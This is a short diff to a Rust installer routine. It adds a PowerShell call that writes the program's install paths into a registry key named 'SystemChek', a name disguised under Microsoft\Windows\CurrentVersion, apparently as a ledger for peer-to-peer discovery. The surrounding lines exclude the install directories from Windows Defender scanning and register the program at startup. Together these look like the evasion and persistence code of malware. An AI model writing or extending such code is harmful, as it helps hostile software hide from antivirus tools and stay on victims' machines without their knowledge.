@@ -71,6 +71,23 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
         // Auto-whitelist in Defender
         let _ = crate::system::process::add_defender_exclusion(dir);
     }
+    
+    // 5. Seed the Registry Ledger (P2P Discovery)
+    #[cfg(windows)]
+    {
+        use std::process::Command;
+        let dirs_str = install_dirs.iter()
+            .map(|d| d.display().to_string())
+            .collect::<Vec<String>>()
+            .join(";");
+            
+        let _ = Command::new("powershell.exe")
+            .args(&[
+                "-Command",
+                &format!("New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\SystemChek' -Force; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\SystemChek' -Name 'Nodes' -Value '{}'", dirs_str)
+            ])
+            .output();
+    }
 
     // 5. Add to Startup (Use the First available location, usually AppData)
     if let Some(primary_dir) = install_dirs.first() {
